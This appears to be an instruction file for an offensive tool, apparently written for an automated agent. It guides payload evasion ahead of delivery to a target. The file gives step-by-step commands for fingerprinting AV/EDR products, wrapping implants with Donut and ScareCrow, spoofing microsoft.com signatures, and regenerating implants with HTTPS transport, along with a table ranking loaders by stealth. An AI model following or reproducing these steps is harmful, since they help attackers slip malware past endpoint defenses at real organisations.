## Evasion Pipeline Instructions

You need to prepare a stealthy payload before delivering it to the target.

### Step 1: Assess Target Defenses

Check services.json / tech_fingerprint.json for AV/EDR indicators:
- Windows Defender, CrowdStrike, SentinelOne, Carbon Black, Cortex XDR, MDE
- Look for process names: MsMpEng.exe, CSFalconService.exe, SentinelAgent.exe

### Step 2: Select Defense Level

| Target Defenses | Defense Level | Pipeline |
|----------------|---------------|----------|
| No AV/EDR (lab) | `none` | Skip evasion — raw implant |
| Defender only | `basic` | ScareCrow wrapping |
| EDR (CrowdStrike, S1, etc.) | `full` | Donut + ScareCrow + pre-flight |
| Unknown | `full` | Assume worst case |

### Step 3: Run the Evasion Pipeline

```bash
# Full evasion (EDR-protected target)
python3 /opt/tazosploit/scripts/evasion_pipeline.py \
  --input /tmp/raw.bin --defense-level full \
  --target-os windows --arch x64 --json

# Basic evasion (Defender only)
python3 /opt/tazosploit/scripts/evasion_pipeline.py \
  --input /tmp/raw.bin --defense-level basic \
  --target-os windows --json

# No evasion (lab, no AV)
python3 /opt/tazosploit/scripts/evasion_pipeline.py \
  --input /tmp/raw.bin --defense-level none --json
```

### Step 4: If Pre-Flight Fails

The pipeline auto-retries with different ScareCrow loaders. If all fail:

1. Try a different ScareCrow loader manually:
   ```bash
   ScareCrow -I /tmp/donut.bin -Loader wscript -domain microsoft.com -sign
   ScareCrow -I /tmp/donut.bin -Loader control -domain microsoft.com -sign
   ScareCrow -I /tmp/donut.bin -Loader msiexec -domain microsoft.com
   ```

2. Try different Donut options:
   ```bash
   donut -i /tmp/raw.bin -o /tmp/donut2.bin -a 2 -e 3 -z 2 -b 1 -k 1 -j "WindowsUpdate"
   ```

3. Change the implant transport (HTTPS may blend better):
   ```bash
   python3 /opt/tazosploit/scripts/generate_implant.py \
     --os windows --arch amd64 --format shellcode --transport https --evasion --json
   ```

### Step 5: Record Results

Save evasion_report.json with:
- Defense level selected and why
- Pipeline steps applied
- Pre-flight test verdict
- Final payload path and format
- Delivery method recommendation

### Key ScareCrow Loader Types:

| Loader | Format | Stealth | Best For |
|--------|--------|---------|----------|
| dll | .dll | Best | DLL sideloading via legitimate process |
| binary | .exe | Good | Direct execution |
| wscript | .js | Good | Web delivery |
| control | .cpl | Good | Control panel extension |
| msiexec | .msi | OK | MSI package delivery |
